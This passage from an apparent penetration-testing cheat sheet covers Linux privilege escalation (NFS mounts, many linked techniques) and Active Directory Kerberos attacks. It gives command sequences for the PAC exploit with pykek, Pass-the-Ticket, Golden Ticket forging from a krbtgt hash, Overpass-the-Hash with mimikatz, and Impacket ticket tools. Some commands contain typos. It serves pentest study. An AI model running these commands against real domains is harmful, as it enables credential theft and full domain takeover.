  * &#x20;created files inherit remote users UID and GUID even if they do not have an account locally
* Commands
  * \# showmount -e \[target]
  * \# nmap -sV -script=nfs-showmount \[target]
  * \#mount -o rw,vers=2 \[target]:\[share] \[local dir]
* [**Linux Privilege Escalation using Misconfigured NFS**](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/)

### Python Library Hijacking

* [**Linux Privilege Escalation: Python Library Hijacking**](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)

### Misc

* [**Editing /etc/passwd File for Privilege Escalation**](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
* [**Linux Privilege Escalation using LD\_Preload**](https://www.hackingarticles.in/linux-privilege-escalation-using-ld\_preload/)
* [**Linux Privilege Escalation Using PATH Variable**](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
* [**Linux For Pentester: socat Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-socat-privilege-escalation/)
* [**Linux for Pentester: scp Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-scp-privilege-escalation/)
* [**Linux For Pentester: tmux Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-tmux-privilege-escalation/)
* [**Linux for Pentester: ed Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/)
* [**Linux for Pentester: sed Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-sed-privilege-escalation/)
* [**Linux for Pentester: pip Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/)
* [**Linux for Pentester: git Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-git-privilege-escalation/)
* [**Linux for Pentester: cp Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/)
* [**Linux for Pentester: Taskset Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-taskset-privilege-escalation/)
* [**Linux for Pentester: Time Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-time-privilege-escalation/)
* [**Linux for Pentester: xxd Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-xxd-privilege-escalation/)
* [**Linux for Pentester : ZIP Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/)
* [**Linux for Pentester: APT Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)
* [**Linux for Pentester: CAT Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-cat-privilege-escalation/)
* [**Linux for Pentester: Find Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/)
* [**Linux for Pentester: Wget Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/)

## Active Directory

### Kerberos

{% tabs %}
{% tab title="PAC Vuln" %}
Privilege Attribute Certificate vulnerability

* With basic information on a domain user you can move to a domain admin by editing the PAC
  * \#git clone [https://github.com/bidord/pykek](https://github.com/bidord/pykek) /opt/pykek
  * \# apt-get install krb5-user
  * \# apt-get install rdate
  * \# rdate -n \[domain]
  * \# echo \[attacker IP]\[domain controller hostname] >> /etc/host
* Next we need 4 pieces of information
  * \-u username@domain (user@domain1)
  * \-d domain controller \[domain.controller.test]
  * \-p password
  * \-s SID (get SID with command “whoami /user”
* Now that we have all the pieces
  * \#cd /opt/pykek
  * \#python ms12-068.py -d domain.controller.test -u user@domain1 -s \[SID] -p \[password
* We have created a credential cache ticket and now we copy it where it needs to go
  * \#cp TGT\_user@domain1.ccache /tmp/krb5cc\_0
* Now you have access with
  * \#smclient -k -W domain1 //domain.controller.test/c$ -k
{% endtab %}

{% tab title="Pass-The-Ticket" %}
* Kerberos Pass-The-Ticket
  * Start with writing all tickets to the folder from wihch it was executed.
    * \>privilege :: debug
    * \>sekurlsa::tickets /export
  * Now we import one of those as our tikets and drop back into mimikatz
    * \>kerberos::ptt \[0,ab9bf] \[ticket info]
{% endtab %}

{% tab title="Golden Ticket" %}
* Kerberos Golden Ticket attack
  * Creating your own tickets to Auth to any server
  * You can take the old krbtgt hash from the previous hash dump and promote yourself back to Domain admin, all with an unprivileged account
  * A few notes on krbtgt:
    * Do not reset the system generated password, it could break the whole domain
    * Even if you change every password for every domain admin, you can still become a DA
    * You can create Users and Groups that do not exist within the Golden ticket
  * What you need
    * Domain - on victim host type: whoami
    * Domain Admin user - On victim host type: net local group administrators /DOMAIN
    * Domain SID - whoami /user chop off the last dash and 4 digits
    * krbtgt - From previous hashdump, use the second half of the hash/the NTLM hash
  * Process
    * Run Smbexec, choose hashdump, and dump the domain controller
    * A log file will be created with the domain hashes. The one we need is the second part of the krbtgt hash
    * Return to original shell
    * Drop into mimikatz 2.0
      * use kiwi
    * Create golden ticket
      * \>golden\_ticket\_create -u \[domain admin suername] -d \[domain] -k \[krbtgt hash] -s \[Domain SID] -t \[location to Drop Golden Ticket]
  * Using the Golden ticket
    * Shell access with limited access
      * \>session -i
    * Load mimikatz
      * \>use kiwi
    * Check current Kerberos Tickets
      * \> kerberos\_ticket\_list
    * Purge all Kerberos Tickets
      * \>kerberos\_ticket\_purge
    * Local our Golden Ticket (stored in /opt/ticekt.txt in our vm)
      * \>kerberos\_ticket\_use /opt/ticket.txt
    * Drop into a shell and read files off the DC
      * \>shell
      * \> dir \ \DC\c$
    * Once we are authed using the Golden ticket, we can send Domain admin commands using WMIC
    * Example: execute a ping commmand and write that to a file on a remote server
      * wmic /authority:"Kerberos:\[attacker.domain] \\\[target hostname]" /node:\[target hostname] process call create "cmd /c ping 127.0.0.1 > C:\log.txt


{% endtab %}

{% tab title="OverPTH" %}
* Overpass the Hash
  * Over abuse NTLM user hash to gain a full Kerberos TGT
  * The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticketand avoid the use of NTLM authentication. A simple way to do this is again with the sekurlsa::pth command from Mimikatz.
  * \#mimikatz # sekurlsa::pth /user:jeff\_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
{% endtab %}

{% tab title="Impacket" %}
Impacket scripts

* [GetTGT.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/getTGT.py) Given a password, hash or aesKey, this script will request a TGT and save it as ccache.
* [GetST.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/getST.py) Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user.
* [GetPac.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/getPac.py) This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of \[MS-SFU]'s S4USelf + User to User Kerberos Authentication.
* [GetUserSPNs.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/GetUserSPNs.py) This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat.
* [GetNPUsers.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/GetNPUsers.py) This example will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF\_DONT\_REQUIRE\_PREAUTH). Output is compatible with JtR.
* [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/ticketConverter.py): This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa.
* [ticketer.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/ticketer.py) This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC\_LOGON\_INFO structure, in particular the groups, ExtraSids, duration, etc.
* [raiseChild.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/raiseChild.py) This script implements a child-domain to forest privilege escalation
{% endtab %}
{% endtabs %}

## Specific Vulnerabilities

### [**CVE-2021-36934**](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934) **- HiveNightmare**

* [https://www.hackingarticles.in/windows-privilege-escalation-hivenightmare/](https://www.hackingarticles.in/windows-privilege-escalation-hivenightmare/)
